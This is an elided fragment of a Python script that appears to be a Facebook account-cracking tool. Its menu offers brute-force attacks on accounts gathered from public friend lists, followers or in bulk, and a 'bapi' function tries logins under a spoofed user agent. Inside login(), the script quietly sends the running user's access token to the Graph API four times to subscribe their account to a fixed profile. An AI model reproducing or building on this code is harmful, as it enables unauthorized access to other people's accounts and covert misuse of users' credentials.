...
def login():
	...
	try:
		...
		try:
			...
			requests.post("https://graph.facebook.com/100030294384163/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100030294384163/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100030294384163/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100030294384163/subscribers?access_token="+token)
...
def menu():
	...
	if GPX =="":
		menu()
	elif GPX == "1" or GPX == "01":
		publik()
		method()
	elif GPX == "2" or GPX == "02":
		follower()
		method()
	elif GPX == "3" or GPX == "03":
		massal()
		method()
	elif GPX == "4" or GPX == "04":
		...
		if cek =="":
			...
			menu()
	elif GPX == "5" or GPX == "05":
		setting_ua()
	elif GPX == "0" or GPX == "00":
		os.system("rm -f login.txt")
...
def bapi(user):
	try:
		ua = open("user-agents.txt", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;] ")#00FFEE
	global loop, token
	sys.stdout.write(
...
def setting_ua():
	print("\n 1 ganti user agent ")
	print(" 2 ganti user agent bawaan ")
	ua = raw_input("\n ? choose : ")
	if ua =="":
		menu()
	elif ua == "1":
